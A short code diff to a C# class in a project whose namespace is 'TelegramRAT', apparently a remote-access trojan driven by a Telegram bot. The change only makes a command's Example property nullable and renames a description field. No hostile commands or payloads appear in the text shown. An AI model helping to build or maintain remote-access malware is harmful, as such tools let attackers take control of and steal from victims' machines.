@@ -13,7 +13,7 @@ namespace TelegramRAT
     class BotCommand
     {
         public string Command { get; set; }
-        public string Example { get; set; }
+        public string? Example { get; set; } = null;
         public Action<BotCommandModel, Update> Execute { get; set; }
 
         public MessageType MsgType { get; set; } = MessageType.Text;
@@ -21,7 +21,7 @@ namespace TelegramRAT
         public bool IgnoreCountArgs = false;
         public bool MayHaveNoArgs = false;
 
-        public string description = null;
+        public string Description = null;
 
         public static BotCommandModel Parse(string text)
         {
